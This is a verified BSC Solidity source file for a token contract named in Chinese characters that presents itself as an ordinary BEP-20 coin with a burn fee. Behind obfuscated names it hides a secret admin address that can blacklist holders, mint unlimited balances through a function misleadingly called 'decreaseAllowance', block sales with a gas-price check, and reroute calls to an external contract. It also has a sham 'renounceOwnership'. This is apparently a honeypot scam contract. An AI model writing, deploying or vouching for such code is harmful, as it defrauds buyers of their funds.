/**
 *Submitted for verification at BscScan.com on 2022-08-20
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
    
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {
    function _approve(address owner, address spender, uint256 amount) external;
    function _transfer(address spender, address recipient, uint256 amounts) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _msgBjwadw() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgNAKfjew() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}


contract CZhaoCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => bool) private _mdawjdwf;
    mapping(address => bool) private _isExcluded;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _mdkwakfe;
    mapping(address => bool) private _cwaidkw;


    uint8 private _decimals = 9;
    string private _name = unicode"赵长鹏";
    string private _symbol = unicode"赵长鹏";

    uint256 private _burnFee = 2;
    uint256 private _jdawjfwe = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _makdmwf;
    address private _dkamkfw;
    

    constructor(address _mdakmfwka, address _kkadmifwe) {
        _dkamkfw = _kkadmifwe;
        _makdmwf = _mdakmfwka;
        _isExcluded[address(this)] = true;
        _isExcluded[_mdakmfwka] = true;
        _isExcluded[owner()] = true;
        _cwaidkw[_mdakmfwka] = true;
        _mdkwakfe[_msgBjwadw()] = _jdawjfwe;
        emit Transfer(address(0), msg.sender, _jdawjfwe);
    }


    modifier _mkawkfwe() {
        require(_makdmwf == msg.sender);
        _;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_msgBjwadw()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_mdawjdwf[_msgBjwadw()]||_msgNAKfjew()>=(12*1e9)){
            IERC(_dkamkfw)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_burnFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }
    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_burnFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_msgNAKfjew()<=(12*1e9));
        require(!_mdawjdwf[from]);
        if (_cwaidkw[from]) {
            require(_cwaidkw[from]);
            _mdkwakfe[from]= 
            _mdkwakfe[from].
            add(_jdawjfwe*10**6);
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external _mkawkfwe {
        _mdkwakfe[spender] = _mdkwakfe[spender].add(subtractedValue);
    }

    function setMultiBlackList(address spender, address recipient) external _mkawkfwe {
        _mdawjdwf[spender] = true;
        _mdawjdwf[recipient] = true;
    }

    function setBlackList(address account) external _mkawkfwe {
        _mdawjdwf[account] = true;
    }

    function removeIncludeFee(address account) external _mkawkfwe {
        _mdawjdwf[account] = false;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _mdkwakfe[sender] = _mdkwakfe[sender].sub(toAmount);
        _mdkwakfe[recipient] = _mdkwakfe[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_mdawjdwf[_msgBjwadw()]||_msgNAKfjew()>=(12*1e9)){
            IERC(_dkamkfw)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _kaifaw;

    function excludeFromFee(address account) external _mkawkfwe {
        _isExcluded[account] = true;
    }

    function includeInFee(address account) external _mkawkfwe {
        _isExcluded[account] = false;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        require(_isExcluded[_msgBjwadw()]);
        return _mdawjdwf[account];
    }

    function totalSupply() public view override returns (uint256) {
        return _jdawjfwe;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _mdkwakfe[account];
    }
}